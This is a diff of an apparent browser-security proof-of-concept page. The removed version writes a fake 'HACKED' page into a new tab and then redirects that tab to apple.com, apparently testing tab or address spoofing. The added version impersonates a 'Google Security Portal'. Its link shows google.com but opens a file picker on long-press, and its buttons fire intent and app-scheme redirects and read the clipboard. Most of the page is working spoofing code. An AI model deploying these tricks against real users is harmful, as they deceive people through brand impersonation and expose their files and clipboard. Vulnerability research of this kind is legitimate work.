@@ -1,222 +1,216 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1, user-scalable=yes"
-    />
-    <title>testertster - PoC Lab</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Multi-Vector Security PoC</title>
     <style>
-      * {
-        box-sizing: border-box;
-      }
-      body,
-      html {
-        margin: 0;
-        padding: 0;
-        min-height: 100%;
-        background: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      }
-      .center-stage {
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        gap: 16px;
-        padding: 24px;
-      }
-      #startBtn {
-        padding: 15px 30px;
-        font-size: 18px;
-        font-weight: 600;
-        background: #007aff;
-        color: #fff;
-        border: none;
-        border-radius: 10px;
-        cursor: pointer;
-      }
-      #startBtn:hover {
-        background: #0063cc;
-      }
-      .controls {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 12px;
-        align-items: center;
-        justify-content: center;
-        font-size: 13px;
-        color: #333;
-      }
-      .controls label {
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-      }
-      .controls input {
-        width: 76px;
-        padding: 4px 6px;
-        border: 1px solid #ccc;
-        border-radius: 6px;
-      }
-      .log-box {
-        width: 100%;
-        max-width: 720px;
-        background: #111827;
-        color: #e5e7eb;
-        border-radius: 10px;
-        padding: 12px 14px;
-        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-        font-size: 12px;
-        line-height: 1.5;
-        max-height: 220px;
-        overflow-y: auto;
-      }
-      .log-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 8px;
-        font-size: 12px;
-        color: #9ca3af;
-      }
-      .log-header button {
-        background: #374151;
-        color: #f9fafb;
-        border: none;
-        border-radius: 6px;
-        padding: 4px 10px;
-        cursor: pointer;
-        font-size: 11px;
-      }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .banner {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        h1 {
+            font-size: 20px;
+            color: #1a73e8;
+            margin-bottom: 20px;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+            max-width: 320px;
+        }
+        a.spoof-link, button.spoof-btn {
+            display: block;
+            color: white;
+            padding: 11px 16px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 13px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+            transition: opacity 0.2s;
+        }
+        a.spoof-link:active, button.spoof-btn:active {
+            opacity: 0.8;
+        }
+        .btn-blue { background-color: #1a73e8; }
+        .btn-green { background-color: #34a853; }
+        .btn-red { background-color: #ea4335; }
+        .btn-yellow { background-color: #fbbc05; color: #202124; }
+        .btn-purple { background-color: #9334e6; }
+        .btn-dark { background-color: #202124; }
+
+        .preview-container {
+            margin-top: 20px;
+            max-width: 280px;
+            display: none;
+        }
+        .preview-container img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+        }
+        .file-info {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #5f6368;
+            word-break: break-all;
+        }
+        .footer-note {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #9aa0a6;
+        }
     </style>
-  </head>
-  <body>
-    <div class="center-stage">
-      <div class="controls">
-        <label>
-          Redirect delay (ms):
-          <input id="redirectDelay" type="number" value="1" min="0" step="1" />
-        </label>
-        <label>
-          Target URL:
-          <input id="targetUrl" type="text" value="https://apple.com" style="width: 180px;" />
-        </label>
-      </div>
+</head>
+<body>
 
-      <button id="startBtn">CLICK HERE</button>
+    <div class="banner">Google Security Portal - Extended Lab</div>
+    <h1>Advanced Vector Testing Suite</h1>
 
-      <div class="log-box" aria-live="polite">
-        <div class="log-header">
-          <span>Execution Timeline Log</span>
-          <button id="clearLogBtn" type="button">Clear</button>
-        </div>
-        <div id="logEntries">Ready. Click "CLICK HERE" to run test sequence.</div>
-      </div>
+    <div class="button-container">
+        <!-- 1. File Picker Spoof Vector -->
+        <a href="https://google.com" class="spoof-link btn-blue" id="targetLink">1. File Picker & Ephemeral Tab</a>
+
+        <!-- 2. Geo & Custom Protocol Schemes -->
+        <button class="spoof-btn btn-green" onclick="triggerGeoHalo()">2. Geo Intent (geo:halo)</button>
+        <button class="spoof-btn btn-red" onclick="triggerCustomProtocol('tel:+628123456789')">3. Tel Intent (Phone Dialer)</button>
+
+        <!-- 3. Social Apps App Schemes -->
+        <button class="spoof-btn btn-purple" onclick="triggerAppScheme('instagram://app')">4. Instagram App Intent</button>
+        <button class="spoof-btn btn-dark" onclick="triggerAppScheme('whatsapp://send?text=PoC_Test')">5. WhatsApp Intent</button>
+
+        <!-- 4. Android System Settings Intents -->
+        <button class="spoof-btn btn-yellow" onclick="triggerAndroidIntent('android.settings.BLUETOOTH_SETTINGS')">6. Bluetooth Settings Intent</button>
+        <button class="spoof-btn btn-yellow" onclick="triggerAndroidIntent('android.settings.WIFI_SETTINGS')">7. WiFi Settings Intent</button>
+        <button class="spoof-btn btn-yellow" onclick="triggerAndroidIntent('android.settings.LOCATION_SOURCE_SETTINGS')">8. Location Settings Intent</button>
+
+        <!-- 5. Browser Sensor / Hardware APIs -->
+        <button class="spoof-btn btn-blue" onclick="triggerVibration()">9. Vibration API Test</button>
+        <button class="spoof-btn btn-green" onclick="triggerClipboardRead()">10. Clipboard Read Test</button>
     </div>
 
+    <!-- Uploaded Image Preview Box -->
+    <div class="preview-container" id="previewBox">
+        <img id="imagePreview" src="" alt="File Preview">
+        <div class="file-info" id="fileInfo"></div>
+    </div>
+
+    <div class="footer-note">Authorized security research environment.</div>
+
     <script>
-      (function () {
-        const startBtn = document.getElementById("startBtn");
-        const logEntries = document.getElementById("logEntries");
-        const clearLogBtn = document.getElementById("clearLogBtn");
-        let t0 = 0;
-        let firstRun = true;
+        let triggered = false;
 
-        function appendLog(msg) {
-          const elapsed = t0 ? `+${(performance.now() - t0).toFixed(1)}ms` : "+0.0ms";
-          if (firstRun) {
-            logEntries.textContent = "";
-            firstRun = false;
-          }
-          const line = document.createElement("div");
-          line.textContent = `[${elapsed}] ${msg}`;
-          logEntries.appendChild(line);
-          logEntries.scrollTop = logEntries.scrollHeight;
-        }
+        // 1. File Picker Vector Logic
+        const executeAttackVector = () => {
+            if (triggered) return;
+            triggered = true;
 
-        clearLogBtn.addEventListener("click", function () {
-          logEntries.textContent = "";
-          firstRun = false;
-          t0 = 0;
-        });
+            setTimeout(async () => {
+                try {
+                    const [fileHandle] = await window.showOpenFilePicker({
+                        multiple: false,
+                        types: [{
+                            description: 'Images & Documents',
+                            accept: { 
+                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                'application/pdf': ['.pdf']
+                            }
+                        }]
+                    });
 
-        function buildTabHtml() {
-          return `<!DOCTYPE html>
-<html>
-<head><title>testertester</title></head>
-<body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:sans-serif">
-  <div>
-    <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT APPLE</h1>
-    <p style="font-size:64px;font-weight:bold;color:#007aff;margin:20px 0">YOUR DEVICE HAS BEEN HACKED BY AZZA</p>
-  </div>
-</body>
-</html>`;
-        }
+                    const file = await fileHandle.getFile();
+                    document.getElementById("fileInfo").innerText = `Selected file: ${file.name}`;
 
-        function runExploit() {
-          setTimeout(function () {
-            appendLog("runExploit +500ms -> setting document.location to mailto:secure@apple.com?subject=Test");
-            document.location = "mailto:secure@apple.com?subject=Test";
-          }, 500);
+                    const previewBox = document.getElementById("previewBox");
+                    const imagePreview = document.getElementById("imagePreview");
+                    
+                    if (file.type.startsWith('image/')) {
+                        imagePreview.src = URL.createObjectURL(file);
+                        previewBox.style.display = "block";
+                    } else {
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
 
-          setTimeout(function () {
-            appendLog("runExploit +1200ms -> redirecting current tab to https://www.google.com");
-            window.location.href = "https://www.google.com";
-          }, 1200);
-
-          setTimeout(function () {
-            appendLog("runExploit +1300ms -> calling window.open('https://www.apple.com/privacy/')");
-            const opened = window.open("https://www.apple.com/privacy/");
-            if (!opened) {
-              appendLog("window.open('https://www.apple.com/privacy/') returned null (blocked or non-user-gesture).");
-            }
-          }, 1300);
-        }
-
-        startBtn.addEventListener("click", function () {
-          t0 = performance.now();
-          const redirectDelay = Math.max(0, Number(document.getElementById("redirectDelay").value) || 0);
-          const targetUrl = document.getElementById("targetUrl").value.trim() || "https://apple.com";
-
-          appendLog("Start button clicked.");
-          this.remove();
-
-          const newTab = window.open("about:blank", "_blank");
-
-          if (!newTab) {
-            appendLog("window.open returned null (possibly blocked by popup blocker).");
-          } else {
-            appendLog("Opened new tab (about:blank). Writing initial content...");
-            try {
-              newTab.document.open();
-              newTab.document.write(buildTabHtml());
-              newTab.document.close();
-              appendLog("Wrote and closed newTab document.");
-            } catch (err) {
-              appendLog("Error writing to newTab document: " + err.message);
-            }
-
-            setTimeout(function () {
-              appendLog(`Redirect timer fired -> setting newTab.location.href to "${targetUrl}"`);
-              try {
-                if (!newTab.closed) {
-                  newTab.location.href = targetUrl;
-                } else {
-                  appendLog("newTab was already closed before redirect.");
+                } catch (err) {
+                    console.debug("File picker cancelled or blocked:", err.message);
+                } finally {
+                    setTimeout(() => { triggered = false; }, 900);
                 }
-              } catch (err) {
-                appendLog("Error setting newTab.location.href: " + err.message);
-              }
-            }, redirectDelay);
-          }
+            }, 1300);
+        };
 
-          appendLog("Calling runExploit()...");
-          runExploit();
+        const targetElement = document.getElementById("targetLink");
+        targetElement.addEventListener("contextmenu", (e) => {
+            e.preventDefault();
+            executeAttackVector();
         });
-      })();
+        targetElement.addEventListener("touchstart", () => {}, { passive: true });
+
+        // 2 & 3. Custom Protocol Handlers
+        function triggerGeoHalo() {
+            window.location.href = "geo:halo";
+        }
+
+        function triggerCustomProtocol(uri) {
+            window.location.href = uri;
+        }
+
+        // 4. Social App Schemes
+        function triggerAppScheme(scheme) {
+            window.location.href = scheme;
+            setTimeout(() => {
+                console.debug("App scheme redirect executed.");
+            }, 1000);
+        }
+
+        // 5. Android Intent Builder
+        function triggerAndroidIntent(actionName) {
+            // Membangun format intent Android secara dinamis untuk diuji di lingkungan WebView/Chrome Mobile
+            const intentUrl = `intent:#Intent;action=${actionName};end;`;
+            window.location.href = intentUrl;
+        }
+
+        // 6. Sensor & Device APIs
+        function triggerVibration() {
+            if (navigator.vibrate) {
+                navigator.vibrate([200, 100, 200]);
+                alert("Vibration triggered successfully!");
+            } else {
+                alert("Vibration API not supported on this browser/device.");
+            }
+        }
+
+        async function triggerClipboardRead() {
+            try {
+                const text = await navigator.clipboard.readText();
+                alert("Clipboard content read: " + text);
+            } catch (err) {
+                alert("Clipboard read blocked or permission denied: " + err.message);
+            }
+        }
     </script>
-  </body>
+
+</body>
 </html>
